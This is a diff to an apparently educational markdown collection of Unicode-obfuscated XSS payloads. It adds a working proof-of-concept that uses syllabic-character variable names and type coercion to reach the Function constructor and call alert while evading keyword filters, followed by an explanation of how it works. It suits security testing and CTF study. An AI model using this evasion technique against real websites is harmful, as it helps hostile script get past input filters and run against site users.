@@ -49,7 +49,22 @@ This file demonstrates **Unicode-obfuscated XSS (Cross-Site Scripting)** payload
 - Great for **reflected XSS**, **stored XSS**, or **CTF-style evasions**.
 
 ---
+## Payload 3 : Payload Written in Inuktitut
+```
+ᐊ='',ᐃ=!ᐊ+ᐊ,ᐅ=!ᐃ+ᐊ,ᐱ=ᐊ+{},ᑎ=ᐃ[ᐊ++],ᓇ=ᐃ[ᓕ=ᐊ],ᓯ=++ᓕ+ᐊ,ᓂ=ᐱ[ᓕ+ᓯ],
+ᐃ[ᓂ+=ᐱ[ᐊ]+(ᐃ.ᐅ+ᐱ)[ᐊ]+ᐅ[ᓯ]+ᑎ+ᓇ+ᐃ[ᓕ]+ᓂ+ᑎ+ᐱ[ᐊ]+ᓇ]
+    [ᓂ](ᐅ[ᐊ]+ᐅ[ᓕ]+ᐃ[ᓯ]+ᓇ+ᑎ+"('ᐊᐃᓐᓇᓂᐅᑦ ᐱᔭᓯᓕᖅ')")()
+```
 
+### ✅ Explanation:
+- Uses Unicode syllabic characters as valid JS variable names
+- No alphanumeric characters are used, bypassing simple keyword filters
+- The technique works because:   
+  ![]+[] → "false"   
+  +[] → 0   
+  []+{} → "[object Object]"   
+ 
+These strings are then indexed to get individual letters
 ## ⚠️ Disclaimer
 
 These payloads are intended for educational use in **authorized environments only**. Never use them for illegal activities.
